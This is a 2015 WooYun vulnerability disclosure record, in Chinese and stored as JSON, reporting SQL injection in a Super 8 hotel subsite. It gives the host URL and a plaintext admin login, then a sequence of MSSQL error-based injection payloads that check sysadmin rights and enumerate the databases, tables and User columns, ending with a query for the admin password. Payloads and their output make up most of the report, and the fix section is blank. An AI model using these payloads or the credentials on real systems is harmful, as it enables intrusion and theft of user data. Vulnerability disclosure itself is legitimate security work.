{"id": 65926, "wybug_id": "wooyun-2015-0137888", "wybug_title": "速8酒店某分站存在多处SQL注入漏洞", "wybug_corp": "速8酒店", "wybug_author": "浮萍", "wybug_date": "2015-08-30 10:03", "wybug_open_date": "2015-10-15 12:08", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "17", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-08-30：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-08-31：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-09-10：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-09-20：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-09-30：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-10-15：\t细节向公众公开  简要描述： 多处sql注入 详细说明：  源于http://wooyun.org/bugs/wooyun-2015-0136465\nhttp://mys8.super8.com.cn:81/Login.aspxadmin super8\n\n\n登录\n\n在搜索处存在sql注入这里随便打开一个\n\n搜索处输入'\n\n输入'and 1= 1 --\n\n输入'and 1= 2 --\n\n这里需要注意的是当第一次搜索后报错后再次搜索时搜索按钮被禁用f12修改即可\n\n这里以供应商管理处为例\n\n搜索\na' and  user>0 and '%'='\n\n\nMSSQL数据库这里抓包用burp测试\na' and (select count(*) from sysobjects)>0  and '%'='\n\n\n不报错是mssql数据库查看数据库版本输入select @@version时将会将第一个@转换为&quot;所以这里用select @@@version\na' and 0<>(select @@@version) --\n\n\n查看数据库名\na' and db_name()>0 and '%'='\n\n\n本地服务名\na' and 0<>(select @@@servername) --\n\n\n\na' and 1=(select IS_SRVROLEMEMBER('sysadmin')) --\n是系统管理员   漏洞证明：  \na' and (select count(name) from master.dbo.sysdatabases)=9--\n可以判断有9个数据库爆库\na' and 1=(select name from master.dbo.sysdatabases where dbid=1) --\n返回在将 nvarchar 值 'master' 转换成数据类型 int 时失败。改变dbid的值则返回的内容如下：\n在将 nvarchar 值 'tempdb' 转换成数据类型 int 时失败。在将 nvarchar 值 'model' 转换成数据类型 int 时失败。在将 nvarchar 值 'msdb' 转换成数据类型 int 时失败。在将 nvarchar 值 'ReportServer$SQL2008' 转换成数据类型 int 时失败。在将 nvarchar 值 'ReportServer$SQL2008TempDB' 转换成数据类型 int 时失败。在将 nvarchar 值 'super8db' 转换成数据类型 int 时失败。在将 nvarchar 值 'super8dbTest' 转换成数据类型 int 时失败。在将 nvarchar 值 'su8' 转换成数据类型 int 时失败。\n我们仅查看super8db数据库\na' and  (select count(name) from sysobjects where xtype='u') =142 --\n经测试有142张表\na' and  (select count(name) from sysobjects where xtype='u' and name like '%user%') =4 --\n与user有关的表有4个\na' and  (select top 1 name from sysobjects where xtype='u' and name like '%user%') =1 --在将 nvarchar 值 'User' 转换成数据类型 int 时失败。a' and  (select top 1 name from sysobjects where xtype='u' and name like '%user%' and name not in('User')) =1 --在将 nvarchar 值 'UserAgent' 转换成数据类型 int 时失败。a' and  (select top 1 name from sysobjects where xtype='u' and name like '%user%' and name not in('User','UserAgent')) =1 --在将 nvarchar 值 'UserAgentRole' 转换成数据类型 int 时失败。a' and  (select top 1 name from sysobjects where xtype='u' and name like '%user%' and name not in('User','UserAgent','UserAgentRole')) =1 --在将 nvarchar 值 'UserRole' 转换成数据类型 int 时失败。\n我们看User表的字段\na' and  (select top 1 col_name(object_id('User'),1) from sysobjects) =1 --在将 nvarchar 值 'SID' 转换成数据类型 int 时失败。a' and  (select top 1 col_name(object_id('User'),2) from sysobjects) =1 --在将 nvarchar 值 'Name' 转换成数据类型 int 时失败。a' and  (select top 1 col_name(object_id('User'),3) from sysobjects) =1 --在将 nvarchar 值 'Password' 转换成数据类型 int 时失败。a' and  (select top 1 col_name(object_id('User'),4) from sysobjects) =1 --在将 nvarchar 值 'State' 转换成数据类型 int 时失败。a' and  (select top 1 col_name(object_id('User'),5) from sysobjects) =1 --在将 nvarchar 值 'CreateTime' 转换成数据类型 int 时失败。a' and  (select top 1 col_name(object_id('User'),6) from sysobjects) =1 --在将 nvarchar 值 'LastModifyTime' 转换成数据类型 int 时失败。a' and  (select top 1 col_name(object_id('User'),7) from sysobjects) =1 --在将 nvarchar 值 'Email' 转换成数据类型 int 时失败。\n\na' and  (select count(SID) from \"User\") =67 --\n67个用户\n\n确实为67个我们查看一下admin的密码\na' and (select Password from \"User\" where Name = 'admin')=1 --\n\n\n   修复方案：     版权声明：转载请注明来源 浮萍@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2015-08-31 12:07 厂商回复： 非常感谢您的提醒. 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-08-31 09:24 |    \t\t小雨爱跑步 \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:1        | 专注移动设备及web安全)\t\t \n  哪个分站？    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}